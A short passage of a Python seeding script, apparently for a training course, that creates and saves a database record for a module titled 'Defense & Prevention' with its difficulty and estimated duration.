    # ── MODULE 06: Defense & Prevention ──────────────────────────────────
    m6 = Module(order_index=6, title="Defense & Prevention", description=DESCRIPTIONS.get(6, ""), icon=ICONS.get(6, "database"), difficulty="Intermediate", estimated_minutes=25)
    db.session.add(m6)
